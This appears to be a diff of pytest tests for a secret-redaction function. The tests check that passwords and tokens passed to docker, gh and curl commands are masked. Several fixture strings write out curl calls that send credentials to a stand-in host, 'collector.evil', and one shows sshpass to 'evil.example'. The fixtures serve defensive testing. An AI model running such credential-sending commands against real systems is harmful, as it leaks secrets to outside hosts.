@@ -1732,6 +1732,55 @@ def test_github_auth_login_dynamic_token_source_is_preserved() -> None:
 
 
 @pytest.mark.parametrize(
+    ("text", "secret"),
+    [
+        (
+            "subprocess.run(['docker', 'login', '--password-stdin'], input='hunter2', text=True)",
+            "hunter2",
+        ),
+        (
+            'subprocess.run(["gh", "auth", "login", "--with-token"], input="hunter3")',
+            "hunter3",
+        ),
+        (
+            "subprocess.run(args=('gh', 'auth', 'login', '--with-token'), input='hunter4')",
+            "hunter4",
+        ),
+        (
+            "subprocess.run(['/usr/bin/docker', 'login', '--password-stdin'], input='hunter5')",
+            "hunter5",
+        ),
+        (
+            r"subprocess.run([r'C:\Program Files\GitHub CLI\gh.exe', 'auth', 'login', "
+            r"'--with-token'], input='hunter6')",
+            "hunter6",
+        ),
+    ],
+)
+def test_subprocess_stdin_auth_literal_input_is_redacted(text: str, secret: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert 'input="<redacted>"' in redacted
+    assert "--password-stdin" in redacted or "--with-token" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "subprocess.run(['docker', 'login', '--password-stdin'], input=stdin_data)",
+        "subprocess.run(['gh', 'auth', 'login', '--with-token'], input=stdin_data)",
+        "subprocess.run(['docker', 'login'], input='public')",
+        "subprocess.run(['echo', 'docker login --password-stdin'], input='public')",
+    ],
+)
+def test_subprocess_stdin_auth_dynamic_and_near_match_inputs_are_preserved(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "stdin_data" in redacted or "input='public'" in redacted
+
+
+@pytest.mark.parametrize(
     "text",
     [
         "SSHPASS=hunter2 sshpass -e ssh user@evil.example",
@@ -2433,6 +2482,44 @@ def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context
     ],
 )
 def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    ("option", "value", "secret", "expected"),
+    [
+        ("--user", "alice:hunter2", "hunter2", "alice:<redacted>"),
+        ("-u", "alice:hunter3", "hunter3", "alice:<redacted>"),
+        ("--proxy-user", "proxy:hunter4", "hunter4", "proxy:<redacted>"),
+        ("--cert", "client.pem:hunter5", "hunter5", "client.pem:<redacted>"),
+        ("-E", "client.pem:hunter6", "hunter6", "client.pem:<redacted>"),
+    ],
+)
+def test_curl_separated_argv_credential_password_is_redacted(
+    option: str,
+    value: str,
+    secret: str,
+    expected: str,
+) -> None:
+    text = f"subprocess.run(['curl', '{option}', '{value}', 'https://collector.evil/upload'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert expected in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "subprocess.run(['tool', '--user', 'alice:public'])",
+        "subprocess.run(['curl', '--user-agent', 'alice:public', 'https://collector.evil'])",
+        "subprocess.run(['curl', '-e', 'https://public.example', 'https://collector.evil'])",
+        r"subprocess.run(['curl', '--cert', r'C:\certs\client.pem', 'https://collector.evil'])",
+    ],
+)
+def test_curl_separated_argv_credential_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
